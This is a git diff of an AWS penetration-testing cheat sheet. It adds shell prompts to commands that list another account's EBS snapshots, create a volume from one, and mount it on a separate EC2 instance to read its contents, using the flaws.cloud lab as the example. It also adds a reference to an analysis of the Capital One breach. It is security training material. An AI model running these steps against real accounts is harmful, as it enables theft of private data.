@@ -152,22 +152,24 @@ aws s3 ls s3://<bucketname> --recursive  | grep -v -E "(Bucket: |Prefix: |LastWr
 ## AWS - Extract Backup
 
 ```powershell
-aws --profile flaws sts get-caller-identity
+$ aws --profile flaws sts get-caller-identity
 "Account": "XXXX26262029",
 
-aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
+
+$ aws --profile profile_name ec2 describe-snapshots
+$ aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
 "SnapshotId": "snap-XXXX342abd1bdcb89",
 
 Create a volume using snapshot
-aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
+$ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
 In Aws Console -> EC2 -> New Ubuntu
-chmod 400 YOUR_KEY.pem
-ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
+$ chmod 400 YOUR_KEY.pem
+$ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
 
 Mount the volume
-lsblk
-sudo file -s /dev/xvda1
-sudo mount /dev/xvda1 /mnt
+$ lsblk
+$ sudo file -s /dev/xvda1
+$ sudo mount /dev/xvda1 /mnt
 ```
 
 ## Bucket juicy data
@@ -220,3 +222,4 @@ pip install -r requirements.txt
 * [Guardzilla video camera hardcoded AWS credential - 0dayallday.org](https://www.0dayallday.org/guardzilla-video-camera-hard-coded-aws-credentials/)
 * [AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity](https://www.virtuesecurity.com/aws-penetration-testing-part-1-s3-buckets/)
 * [AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity](https://www.virtuesecurity.com/aws-penetration-testing-part-2-s3-iam-ec2/)
+* [A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019](https://blog.cloudsploit.com/a-technical-analysis-of-the-capital-one-hack-a9b43d7c8aea?gi=8bb65b77c2cf)
